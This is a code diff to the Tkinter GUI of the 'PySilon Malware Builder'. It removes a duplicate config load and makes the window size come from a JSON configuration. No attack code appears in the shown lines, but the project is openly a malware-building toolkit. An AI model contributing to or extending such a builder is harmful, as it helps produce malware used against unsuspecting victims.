@@ -12,16 +12,11 @@ import requests
 with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
     builder_configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))
 
-
-
 class Builder:
     global builder_configuration
     def __init__(self, master):
         self.master = master
         self.master.title('PySilon Malware Builder')
-
-        with open('resources/assets/builder_configuration.json', 'r', encoding='utf-8') as load_configuration:
-            builder_configuration = json.loads(''.join(load_configuration.readlines()).replace('\n', ''))
 
         try: self.malware_latest_version = json.loads(requests.get('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/assets/builder_configuration.json').text.replace('\n', ''))['malware_version']
         except: self.malware_latest_version = None
@@ -777,9 +772,10 @@ class Builder:
 
 
 def main():
+    global builder_configuration
     root = tk.Tk()
     Builder(root)
-    root.geometry('700x500')
+    root.geometry('x'.join(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root']['resolution']))
     #root.wm_attributes('-transparentcolor', '#ab23ff')
     root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
     root.mainloop()
